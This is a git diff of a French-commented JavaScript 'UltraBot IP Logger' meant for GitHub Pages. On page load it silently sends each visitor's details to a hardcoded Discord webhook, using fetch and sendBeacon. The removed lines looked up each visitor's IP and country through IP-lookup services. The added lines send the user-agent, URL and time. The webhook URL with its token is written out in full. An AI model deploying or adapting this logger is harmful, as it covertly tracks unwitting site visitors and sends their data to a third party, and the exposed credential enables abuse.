@@ -1,10 +1,10 @@
 // =============================================
-// ULTRABOT IP LOGGER - GITHUB PAGES VERSION
+// ULTRABOT IP LOGGER v5 - FIX 400 ERROR
 // =============================================
 
-const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz"; // ← METS TA WEBHOOK ICI
+const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz"; // ← Remplace par ta vraie webhook
 
-async function sendToWebhook(info) {
+async function sendToWebhook() {
     const payload = {
         username: "UltraBot Logger",
         embeds: [{
@@ -12,59 +12,46 @@ async function sendToWebhook(info) {
             color: 0xe01a1a,
             timestamp: new Date().toISOString(),
             fields: [
-                { name: "IP", value: `\`${info.ip || "Inconnu"}\``, inline: true },
-                { name: "Pays", value: info.country || "Inconnu", inline: true },
-                { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 280)}\`\`\``, inline: false },
-                { name: "Page", value: window.location.href, inline: false },
-                { name: "Referer", value: document.referrer || "Direct", inline: false },
+                { name: "IP", value: "`Récupération en cours...`", inline: true },
+                { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 250)}\`\`\``, inline: false },
+                { name: "URL", value: window.location.href, inline: false },
                 { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: true }
             ]
         }]
     };
 
     try {
-        await fetch(WEBHOOK, {
+        const response = await fetch(WEBHOOK, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload),
-            mode: 'no-cors'        // Important pour GitHub Pages
+            mode: "no-cors"
         });
-        console.log("%c[UltraBot] Visiteur loggé", "color: #e01a1a");
+
+        console.log("%c[UltraBot] ✅ Requête envoyée (no-cors)", "color: lime");
     } catch (e) {
-        // Silencieux
+        console.log("%c[UltraBot] Erreur fetch", "color: red");
     }
 }
 
-// Récupération IP avec plusieurs services
-async function getIPInfo() {
-    const services = [
-        "https://api.ipify.org?format=json",
-        "https://ipapi.co/json/",
-        "https://freeipapi.com/api/json",
-        "https://api.myip.com"
-    ];
+// Méthode Beacon (la plus fiable sur GitHub Pages)
+function sendWithBeacon() {
+    const data = {
+        content: "**UltraBot - Visiteur détecté via Beacon**",
+        username: "UltraBot Logger"
+    };
 
-    for (let url of services) {
-        try {
-            const res = await fetch(url);
-            if (res.ok) {
-                const data = await res.json();
-                const ip = data.ip || data.query || data.address || "Inconnu";
-                const country = data.country_name || data.country || data.cc || "Inconnu";
-
-                await sendToWebhook({ ip, country });
-                return;
-            }
-        } catch (_) {}
-    }
-
-    // Fallback si tout échoue
-    await sendToWebhook({ ip: "IP bloquée", country: "Inconnu" });
+    const blob = new Blob([JSON.stringify(data)], { type: "application/json" });
+    navigator.sendBeacon(WEBHOOK, blob);
+    console.log("%c[UltraBot] Beacon envoyé", "color: orange");
 }
 
 // Lancement
 window.addEventListener('load', () => {
+    console.log("%c[UltraBot] Script chargé - Tentative...", "color: red");
+
     setTimeout(() => {
-        getIPInfo();
-    }, 700);
+        sendToWebhook();
+        sendWithBeacon();        // Méthode la plus fiable
+    }, 800);
 });
